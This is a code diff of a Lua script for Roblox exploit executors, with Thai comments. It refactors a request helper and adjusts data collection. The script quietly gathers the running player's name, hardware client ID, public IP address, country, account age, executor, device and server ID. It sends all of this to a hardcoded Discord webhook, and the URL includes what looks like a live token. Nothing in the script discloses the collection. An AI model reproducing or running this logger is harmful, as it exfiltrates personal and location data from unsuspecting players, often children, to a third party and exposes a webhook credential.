@@ -3,7 +3,18 @@ local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
-local req = (syn and syn.request) or (http and http.request) or (request)
+-- ฟังก์ชันใช้คำสั่ง request แบบปลอดภัย
+local function SafeRequest(options)
+    if syn and syn.request then
+        return syn.request(options)
+    elseif http_request then
+        return http_request(options)
+    elseif request then
+        return request(options)
+    elseif KRNL_LOADED and http then
+        return http.request(options)
+    end
+end
 
 function SendMessage(url, message)
     local headers = {
@@ -13,7 +24,7 @@ function SendMessage(url, message)
         ["content"] = message
     }
     local body = HttpService:JSONEncode(data)
-    req({
+    SafeRequest({
         Url = url,
         Method = "POST",
         Headers = headers,
@@ -39,7 +50,7 @@ function SendMessageEMBED(url, embed)
         }
     }
     local body = HttpService:JSONEncode(data)
-    req({
+    SafeRequest({
         Url = url,
         Method = "POST",
         Headers = headers,
@@ -47,8 +58,7 @@ function SendMessageEMBED(url, embed)
     })
 end
 
-local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
-
+-- ตรวจจับอุปกรณ์
 local function detectDevice()
     if UserInputService.TouchEnabled then
         local platform = UserInputService:GetPlatform()
@@ -66,42 +76,36 @@ local function detectDevice()
     end
 end
 
+-- ดึงข้อมูล
 local success, hwid = pcall(function()
     return game:GetService("RbxAnalyticsService"):GetClientId()
 end)
+hwid = success and hwid or "Unavailable"
 
-local success2, ip = pcall(function()
-    return game:HttpGet("https://api.ipify.org")
-end)
-
-local countryInfo = {}
-local success3, result = pcall(function()
-    return game:HttpGet("https://ipwho.is/")
-end)
-if success3 then
-    countryInfo = HttpService:JSONDecode(result)
-end
-
+local ip = game:HttpGet("https://api.ipify.org", true)
+local countryInfo = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/", true))
 local flag = countryInfo.flag and countryInfo.flag.emoji or ""
-local country = countryInfo.country or ""
-local executor = identifyexecutor and identifyexecutor() or {"Unknown", ""}
+local country = countryInfo.country or "Unknown"
+
+local executor = (identifyexecutor and type(identifyexecutor()) == "string") and {identifyexecutor(), ""} or {"Unknown", ""}
 local device = detectDevice()
 local jobId = game.JobId
 local placeLink = "https://www.roblox.com/games/" .. game.PlaceId
 local accAge = player.AccountAge .. " days"
-local playerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+local playerCount = Players.NumPlayers .. "/" .. Players.MaxPlayers
 
+-- ส่ง Embed
 local embed = {
     ["title"] = "Player Information",
     ["description"] = "",
     ["color"] = 65280,
     ["fields"] = {
         { ["name"] = "Name", ["value"] = player.Name },
-        { ["name"] = "HWID", ["value"] = hwid or "Unknown" },
-        { ["name"] = "IP", ["value"] = ip or "Unknown" },
+        { ["name"] = "HWID", ["value"] = hwid },
+        { ["name"] = "IP", ["value"] = ip },
         { ["name"] = "Country", ["value"] = flag .. " " .. country },
         { ["name"] = "Account Age", ["value"] = accAge },
-        { ["name"] = "Executor", ["value"] = executor[1] .. (executor[2] ~= "" and " (" .. executor[2] .. ")" or "") },
+        { ["name"] = "Executor", ["value"] = executor[1] },
         { ["name"] = "Device", ["value"] = device },
         { ["name"] = "Server ID", ["value"] = jobId },
         { ["name"] = "Map Link", ["value"] = placeLink },
@@ -112,4 +116,6 @@ local embed = {
     }
 }
 
+-- URL Webhook ของคุณ
+local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
 SendMessageEMBED(url, embed)
